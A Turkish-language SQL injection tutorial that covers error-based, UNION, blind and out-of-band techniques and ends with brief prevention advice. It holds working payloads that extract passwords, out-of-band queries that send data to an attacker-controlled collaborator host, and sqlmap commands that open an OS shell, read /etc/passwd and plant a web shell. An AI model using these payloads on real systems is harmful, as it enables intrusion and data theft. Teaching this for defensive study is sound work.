# SQL Injection
SQL Injection, kullanıcıdan alınan verinin doğrudan SQL sorgusuna eklenmesi ve yeterli filtreleme/sanitizasyon yapılmaması sonucunda ortaya çıkan bir güvenlik zafiyetidir.
Bu zafiyetin istismarı ile saldırgan:
- Veritabanındaki tüm verileri okuyabilir,
- Veri ekleyebilir/güncelleyebilir/silebilir,
- Yetkileri aşarak hassas bilgilere erişebilir,
- Bazı durumlarda işletim sistemi seviyesinde komut çalıştırabilir.

# SQL Nedir
SQL (Structured Query Language), ilişkisel veritabanlarında depolanan verileri yönetmek ve sorgulamak için kullanılan standart bir dildir; temel olarak verileri okuma (SELECT), ekleme (INSERT), güncelleme (UPDATE) ve silme (DELETE) işlemlerini yapmayı, ayrıca tablolar ve veritabanı yapısını oluşturma (CREATE), değiştirme (ALTER) ve silme (DROP) gibi işlemlerle veritabanını düzenlemeni sağlar. SQL bilmek, SQL Injection (SQLi) gibi zafiyetleri anlamanın temelidir çünkü bu saldırılar, veritabanıyla etkileşim şeklimizi manipüle ederek çalışır.

# Veritabanı Nedir
Veritabanı, verileri düzenli ve erişilebilir bir şekilde saklamaya yarayan yapıdır.
Bir veritabanı DBMS (Database Management System) tarafından yönetilir.
DBMS’ler temelde ikiye ayrılır:
- İlişkisel (Relational) – Örn: MySQL, PostgreSQL, MSSQL, Oracle
- İlişkisel olmayan (NoSQL) – Örn: MongoDB, Redis, Cassandra
Bu yazının odak noktası ilişkisel veritabanlarıdır.
Örneğin, "mağaza" adında bir veritabanınız var ve kayıtlı kullanıcılar ile aldığınız siparişleri saklamak istiyorsunuz. Bu bilgileri tablolar kullanarak depolarsınız.
Örnek şema:
![alt text](resim.png)

# Tablo Nedir
Tablolar, sütunlar (columns) ve satırlardan (rows) oluşur.
- Sütunlar: Depolanacak veri türünü tanımlar (örn: id, isim, email).
- Satırlar: Bu sütunlara karşılık gelen veri kayıtlarını içerir.
Örnek tablo yapısı:
![alt text](resim-1.png)

# SQL Komutları
## SELECT
SELECT komutu, veritabanından veri sorgulamak için kullanılır.
Örnek:
```sql
SELECT * FROM users;
```
- SELECT → Veri almak istediğimizi belirtir.

- \* (yıldız) → Tüm sütunları seçmek istediğimizi söyler.

- FROM users → users adındaki tablodan veri alınacağını belirtir.

Aşağıdaki sorgu yine tüm sütunları döndürür, ancak LIMIT 1 ifadesi sadece 1 satır getirilmesini sağlar:
```sql
SELECT * FROM users LIMIT 1;
```

WHERE ifadesi, belirli koşullara uyan kayıtları filtrelemek için kullanılır:
```sql
SELECT * FROM users where username='admin';
```

Bu sadece kullanıcı adının admine eşit olduğu satırları döndürür.

LIKE ifadesi, tam eşleşme yerine belirli bir desenle (pattern) arama yapmamızı sağlar. % sembolü, sıfır veya daha fazla karakter yerine geçer:
```sql
SELECT * FROM users where username LIKE 'a%';
```

## UNION
UNION ifadesi, iki veya daha fazla SELECT sorgusunun sonuçlarını birleştirerek tek bir sonuç seti olarak döndürür. Bu sayede birden fazla tablodan veya sorgudan veri alabilirsin.

Kurallar:
- UNION ifadesinden önceki ve sonraki SELECT sorguları aynı sayıda sütun döndürmelidir.
- Bu sütunların veri tipleri (data types) uyumlu olmalıdır (örneğin, birinde INT diğerinde VARCHAR olmamalı).

```sql
SELECT name, address, city, postcode FROM customers
UNION
SELECT company, address, city, postcode FROM suppliers;
```

## INSERT
INSERT ifadesi, bir tabloya yeni veri satırı eklemek için kullanılır.

```sql
INSERT INTO users (username, password) VALUES('bob', 'password')
```

- INSERT INTO users → Veriyi ekleyeceğimiz tabloyu belirtir.
- (username, password) → Eklenecek sütunları tanımlar.
- VALUES ('bob', 'password') → Bu sütunlara karşılık gelen verileri belirtir.

## UPDATE
UPDATE ifadesi veritabanına bir veya daha fazla veri satırını güncellemek istediğimizi belirtir.

```sql
UPDATE users SET username='root', password='pass123' where username='admin';
```

- UPDATE users → users tablosundaki kayıtların güncelleneceğini belirtir.
- SET username='root', password='pass123' → Güncellenecek sütunlar ve yeni değerleri burada belirtilir; bu örnekte username "root" ve password "pass123" olarak değiştirilir.
- WHERE username='admin' → Sadece username değeri "admin" olan kayıtlar üzerinde güncelleme yapılır. Bu koşul olmazsa, tablodaki tüm satırlar güncellenir.

## DELETE 
DELETE ifadesi, bir tabloda bulunan bir veya daha fazla kayıt satırını silmek için kullanılır. SELECT sorgusuna benzer şekilde WHERE koşulu ile hangi satırların silineceği belirtilir.
```sql
DELETE FROM users where username='martin';
```

# SQL Injection Çalışma Prensibi
Örneğin URL şu olsun:
```url
https://example.com/blog?id=1
```

Bu URL'deki id parametresi, web uygulamasının veritabanından blog yazısını çekmek için kullandığı SQL sorgusuna doğrudan ekleniyor olabilir:
```sql
SELECT * FROM blog WHERE id=1 AND private=0 LIMIT 1;
```

Diyelim ki, id=2 olan makale özel (private=1) ve bu yüzden site üzerinde görüntülenmiyor. Saldırgan URL parametresine aşağıdaki gibi kötü niyetli bir giriş yapabilir:
```url
https://example.com/blog/id=2;--
```

Bu durumda sorgu şu şekilde değişir:
```sql
SELECT * FROM blog WHERE id=2;-- AND private=0 LIMIT 1;
```

Burada -- SQL’de yorum satırı işaretidir, sonrasındaki AND private=0 LIMIT 1 kısmı yok sayılır ve sorgu sadece id=2 şartıyla çalışır. Böylece özel makale engel atlatılarak çekilebilir.

Bu tip saldırılara in-band SQL Injection denir ve saldırgan, veri tabanından direkt yanıt alır. SQL Injection’ın üç ana türü vardır:
- In-band (en yaygın),
- Blind (veri doğrudan görünmez, mantıksal sonuçlara göre çıkarım yapılır),
- Out-of-band (veri farklı kanallarla elde edilir).

## In-Band SQL Injection
In-Band SQL Injection, saldırganın aynı kanal üzerinden hem zafiyeti sömürmesini hem de sonuçları almasını sağlar. En yaygın ve en kolay istismar edilen SQLi türüdür. Örneğin, web uygulamasına enjekte edilen zararlı sorgu sonucunda veri doğrudan sayfa çıktısında veya hata mesajlarında görünür.

## Error Based SQL Injection
Error-Based SQL Injection, veritabanının hata mesajlarını doğrudan kullanıcıya döndürmesi sayesinde veritabanı yapısı, tablolar, sütunlar gibi hassas bilgilerin çıkarılmasına olanak sağlar. Hata mesajları saldırgana bilgi sızıntısı yapar ve genellikle yapı keşfi için kullanılır.

Örnek Payload’lar ile Veri Sızdırma
Microsoft SQL Server:
```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret');
```

Burada 'secret' ifadesi hatanın bir parçası olarak döner.

PostgreSQL:
```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);
```

CAST(... AS int) ile string değeri integer’a dönüştürmeye çalışmak hata verir ve string doğrudan hata mesajında görünür.

MySQL:
```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')));
```

EXTRACTVALUE() fonksiyonuna geçersiz XML/XPath girdisi verilerek hata tetiklenir, içine gömülen veri hata mesajında görünür.


# UNION Based SQL Injection
Bu SQL Injection türü SQL UNION operatörünü bir SELECT ifadesi ile birleştirerek sayfaya ek sonuçlar döndürmek için kullanılır. Bu yöntem geniş miktarda veri çıkartmanın en yaygın yoludur.

UNION operatörü, iki veya daha fazla SELECT sorgusunun sonuçlarını birleştirerek tek bir sonuç seti olarak döndürür. Saldırgan, hedef uygulamanın orijinal sorgusuna ek olarak kendi sorgusunu UNION ile ekleyerek, veritabanından istediği ek verileri çekebilir.

Ancak UNION sorgularında:
- Birleşen sorguların sütun sayısı aynı olmalı,
- Sütunların veri tipleri uyumlu olmalı,
- Yanlış sütun sayısı veya tip uyuşmazlığı hata verir ve saldırı başarısız olur.

Örnek:
```sql
-- Normal sorgu:
SELECT id, username, email FROM users WHERE id=1;

-- UNION ile veri çekme:
SELECT id, username, email FROM users WHERE id=1
UNION
SELECT null, database(), null;
```

Burada ikinci sorgu, ilk sorgu ile aynı sütun sayısına sahiptir (3 sütun) ve ikinci sütunda veritabanı ismini getirir. Böylece saldırgan veritabanı hakkında bilgi edinir.

## Sütun sayısı tespiti
Saldırganın genelde ilk yaptığı şey, hedef sorgunun kaç sütun döndürdüğünü bulmaktır.
Örnek:
```sql
' ORDER BY 1--  
' ORDER BY 2--  
' ORDER BY 3--  
```

Sütun sayısı aşılırsa hata verir. Böylece kaç sütun olduğu öğrenilir.

## Sütun veri tipi tespiti

Saldırgan, hangi sütunun çıktısını sayfada gösterebileceğini NULL veya test değerleriyle test eder. Örneğin:

' UNION SELECT NULL, 'test', NULL--  

## UNION Based SQL Injection İle Veri Çıkartmak
Aşağıda popüler veritabanları için işinize yarayabilecek veri çıkartma yolları listelenmiştir:

Oracle:
```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
```
Microsoft:
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
PostgreSQL:
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```
MySQL:
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

## Örnek POC
```url
http://example.com/blog?id=1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database() LIMIT 1,5--
```

Bu, mevcut veritabanındaki tabloların isimlerinden 5 tanesini çeker.

# Blind SQL Injection - Boolean Based
Blind SQL Injection Boolean Based

Boolean tabanlı SQL Injection, injection denemelerinden aldığımız yanıtın true/false gibi sadece iki olası sonucu olduğu durumlarda kullanılır. Bu sonuçlar, SQL Injection payload'ının başarılı olup olmadığını anlamamızı sağlar. Bu iki yanıttan yola çıkarak, karakter karakter veritabanı yapısını keşfetmek mümkündür.

Örneğin aşağıdaki URL ile karşılaştınız:
```url
http://example.com/checkuser?username=admin
```

Sunucu bu isteğe şu JSON yanıtını verir:
```json
{"taken": true}
```

Bu API endpoint, kullanıcı adının sistemde olup olmadığını kontrol eder. Eğer taken değeri true ise kullanıcı adı alınmış, false ise alınmamıştır. İşlenen SQL sorgusu ise yaklaşık olarak şöyledir:
```sql
SELECT * FROM users WHERE username='%username%' LIMIT 1;
```
Burada, username parametresine gönderilen değer doğrudan sorguya eklenmektedir ve eğer yeterince filtrelenmezse, SQL Injection mümkün hale gelir.

Boolean Tabanlı True/False Örnekleri
İlk olarak, basit payload’larla sorgunun true veya false döndürmesini sağlayabiliriz:
```sql
' OR 1=1--  
' OR 1=0--  
```

- ```' OR 1=1--``` sorguyu her zaman true yapar, veritabanı sorgusu başarılı olur.
- ```' OR 1=0--``` sorguyu her zaman false yapar, sorgu başarısız olur.

Bu iki durum, hedef uygulamanın yanıtını gözlemleyerek injection olup olmadığını anlamamıza yardımcı olur.

Sütun Sayısını Belirlemek

UNION sorguları kullanırken sütun sayısı ve türü kritik önemdedir. Boolean tabanlı saldırıda da sütun sayısını öğrenmek gerekir. Örneğin, users tablosundaki sütun sayısını tespit etmek için şu payload’ı kullanırız:
```sql
test' UNION SELECT NULL;-- -
```

Eğer uygulama false dönerse sütun sayısı yanlış demektir, daha fazla sütun ile denemeye devam ederiz:
```sql
test' UNION SELECT NULL,NULL;-- -  
test' UNION SELECT NULL,NULL,NULL;-- -  
```

True döndüğü anda doğru sütun sayısını bulmuş oluruz.

Veritabanı İsmini Karakter Karakter Öğrenmek

Sütun sayısını bulduktan sonra, veritabanının adını bulmak için karakter bazlı boolean sorguları kullanılır. Örneğin, database() fonksiyonunu sorgulayıp LIKE operatörü ile sorgu yapabiliriz:
```sql
test' AND database() LIKE 'a%';--  
```
- Eğer bu sorgu true dönerse, veritabanı adı 'a' harfi ile başlıyor demektir.
- Değilse, 'b', 'c' ... şeklinde diğer harfler denenir.

Bu şekilde, veritabanı adının tüm karakterleri, her seferinde tek bir harf deneyerek bulunur.

Şimdi benzer bir yöntem ile information_schema veritabanını kullanarak tablo adlarını sıralayabiliriz

```sql
test' UNION SELECT null,null,null FROM information_schema.tables where table_schema='table_name' AND table_name like 'a%';-- -
```
Bu sorgu information_schema veritabanındaki tablolar tablosunda veri tabanı adının eşleştiği ve tablo adının a ile başladığı sonuçları arar. Önceki gibi harfleri sayılar ve karakterleri döngü yapmamız ve pozitif bir eşleşme bulana kadar devam etmemiz gerekecek

Tabloları Listeleme (information_schema)

information_schema.tables kullanarak tablo adlarını öğrenebiliriz:

```sql
test' UNION SELECT NULL,NULL,NULL 
FROM information_schema.tables 
WHERE table_schema='database_name' 
AND table_name LIKE 'a%';-- -
```

Bu sorgu, belirtilen veritabanındaki tabloları listeler. Harf harf deneyerek tüm tablo adları elde edilir.
Kolonları Listeleme

Tablolar bulunduktan sonra, information_schema.columns ile kolon isimleri öğrenilir:

```sql
test' UNION SELECT NULL,NULL,NULL 
FROM information_schema.columns 
WHERE table_schema='database_name' 
AND table_name='table_name' 
AND column_name LIKE 'a%';-- -
```

Aynı şekilde karakter karakter test ederek kolon isimleri elde edilir.
Veri Çekme

Kolon adları öğrenildikten sonra hedef veriyi boolean mantığı ile çekebiliriz.
Örneğin users tablosundan admin kullanıcısının şifresini almak:
```sql
test' UNION SELECT NULL,NULL,NULL 
FROM users 
WHERE username='admin' 
AND password LIKE 'a%';-- -
```
Her karakter test edilerek, tam parola ortaya çıkar.

Özet:
Boolean tabanlı SQL Injection’da, her sorgunun sonucu yalnızca true veya false olur. Bu basit mantık ile sütun sayısından veritabanı adlarına, tablolardan kolonlara kadar tüm veritabanı yapısı ve içerik karakter karakter ortaya çıkarılabilir.

# Blind SQL Injection – Time Based

Time-based SQL Injection, Boolean-based SQL Injection’a oldukça benzer çalışır.
Ancak burada sorgunun doğru veya yanlış olduğuna dair doğrudan bir yanıt (true/false) yoktur. Bunun yerine, sorgunun tamamlanma süresi üzerinden başarı tespiti yapılır.

Eğer sorgu doğru koşulda çalışıyorsa, veritabanına kasıtlı olarak gecikme (delay) eklenir ve bu gecikme istemci tarafında ölçülür.
Bu yöntem genellikle SLEEP() (MySQL), pg_sleep() (PostgreSQL) veya WAITFOR DELAY (MSSQL) fonksiyonları ile uygulanır.

Örnek: Sütun Sayısını Bulma

Boolean-based saldırıda olduğu gibi, önce doğru sütun sayısını bulmamız gerekir. Ancak burada doğrulama kriterimiz yanıt süresi olacaktır.
Örneğin:
```sql
test' UNION SELECT SLEEP(5);-- -
```

- Eğer yanıt süresinde gecikme yoksa → sütun sayısı yanlış.
- Eğer yanıt ~5 saniye gecikirse → sütun sayısı doğru.

Daha fazla sütun ekleyerek doğru sayıya ulaşırız:
```sql
test' UNION SELECT SLEEP(5), NULL;-- -
test' UNION SELECT SLEEP(5), NULL, NULL;-- -
```

True sonucu yerine gecikme bizim doğrulama kriterimizdir.
Veritabanı Bilgilerini Keşfetme

Time-based saldırılarda, Boolean-based payload’lar SLEEP() fonksiyonu ile birleştirilerek çalışır.

Örneğin, veritabanı adının “a” ile başlayıp başlamadığını test etmek:
```sql
test' AND IF(database() LIKE 'a%', SLEEP(5), 0);-- -
```
- Eğer ad “a” ile başlıyorsa → yanıt 5 saniye gecikir.
- Değilse → yanıt normal hızda döner.

Aynı mantıkla tablolar, kolonlar ve veriler karakter karakter elde edilebilir:

```sql
test' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)='u', SLEEP(5), 0);-- -
```

Özet:
Time-based SQL Injection, doğrudan çıktı alınamayan durumlarda kullanılır. Yanıt süresi bir “true/false” göstergesi olarak değerlendirilir. Boolean-based tekniklerin tümü, burada zaman gecikmesi mantığı ile uygulanabilir.

# OUT-of-BAND SQL Injection
Out-of-Band SQL Injection, saldırı sonucunu aynı HTTP yanıtı üzerinden değil, harici bir ağ çağrısı üzerinden elde etme yöntemidir.
Yani veri tek bir kanal üzerinden gönderilmez:
- Saldırı kanalı: SQL Injection payload’ının gönderildiği normal HTTP isteği
- Veri toplama kanalı: Saldırganın kontrol ettiği bir servis (HTTP/DNS gibi)

Bu yöntem özellikle Blind SQL Injection senaryolarında, veri çıkartmanın klasik Boolean veya Time-based tekniklerle çok yavaş veya imkânsız olduğu durumlarda kullanılır.

### Temel Çalışma Mantığı
- SQL sorgusuna, veritabanının dış dünyaya bir HTTP veya DNS isteği yapmasını sağlayacak bir payload enjekte edilir.
- Bu isteğin domaini saldırganın kontrolündeki bir sunucuya yönlendirilir (ör. BURP-COLLABORATOR-SUBDOMAIN).
- Veri bu domain ismine gömülerek gönderilir.
- Saldırgan, kendi sunucusuna gelen istekten veriyi okur.

Örnek Payload’lar
Oracle:
```sql
SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
           <!DOCTYPE root [ 
             <!ENTITY % remote SYSTEM "http://' || (SELECT YOUR-QUERY-HERE) || '.BURP-COLLABORATOR-SUBDOMAIN/"> 
             %remote;
           ]>'),
  '/l'
) FROM dual;
```

Microsoft SQL Server:
```sql
DECLARE @p VARCHAR(1024);
SET @p = (SELECT YOUR-QUERY-HERE);
EXEC('master..xp_dirtree "//' + @p + '.BURP-COLLABORATOR-SUBDOMAIN/a"');
```

PostgreSQL:
```sql
CREATE OR REPLACE FUNCTION f() RETURNS void AS $$
DECLARE 
    c TEXT;
    p TEXT;
BEGIN
    SELECT INTO p (SELECT YOUR-QUERY-HERE);
    c := 'COPY (SELECT '''') TO PROGRAM ''nslookup ' || p || '.BURP-COLLABORATOR-SUBDOMAIN''';
    EXECUTE c;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

SELECT f();
```

MySQL:
```sql
SELECT YOUR-QUERY-HERE 
INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a';
```

# SQL Injection Sonrası Yetki Yükseltme & Post-Exploitation (sqlmap)
## Komut Çalıştırma
Eğer SQL Injection, veritabanı üzerinden sistem komutu çalıştırmaya izin veriyorsa (xp_cmdshell, COPY TO PROGRAM, sys_exec() gibi fonksiyonlar açık ise), sqlmap bunu otomatik tespit edip sana shell verebilir.
```bash
sqlmap -u "http://example.com/blog?id=1" --os-shell
```
- sqlmap, DBMS üzerinde komut çalıştırabilecek uygun fonksiyonu bulursa etkileşimli shell verir.

## Dosya Okuma
Veritabanının dosya sistemi erişimi varsa sqlmap ile direkt olarak hedef sunucudaki dosyaları okuyabilirsin:
```bash
sqlmap -u "http://example.com/blog?id=1" --file-read="/etc/passwd"
```
Bu, web server yapılandırması, credential dosyaları veya kod incelemesi için kullanılır.

## Dosya Yazma
Sunucuya dosya yükleyip web shell bırakmak için kullanılabilir.
```bash
sqlmap -u "http://example.com/blog?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```
- shell.php kendi sisteminde hazır olmalı.
- --file-dest sunucuda yazılacak tam yolu belirtir.

### Kullanıcı Yetkilerini Görme
Bu işlemler için veritabanı kullanıcı yetkilerini kontrol etmek önemli.
```bash
sqlmap -u "http://example.com/blog?id=1" --privileges --current-user
```
- Çıktıda FILE, SUPER, EXECUTE gibi yetkiler varsa file read/write ve command execution ihtimali artar.

# SQL Injection Önleme Yöntemleri
Parametrik Sorgular (Prepared Statements) Kullan
- Kullanıcı girdisini SQL sorgusunun bir parçası olarak birleştirme. Bunun yerine sorguyu ve parametreleri ayrı gönder.

Örnek (PHP PDO):
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

ORM (Object-Relational Mapping) Tercih Et
- Doctrine, Eloquent, SQLAlchemy gibi ORM kütüphaneleri, SQL Injection riskini azaltır.
- Direkt olarak string birleştirme yerine model fonksiyonlarını kullan.


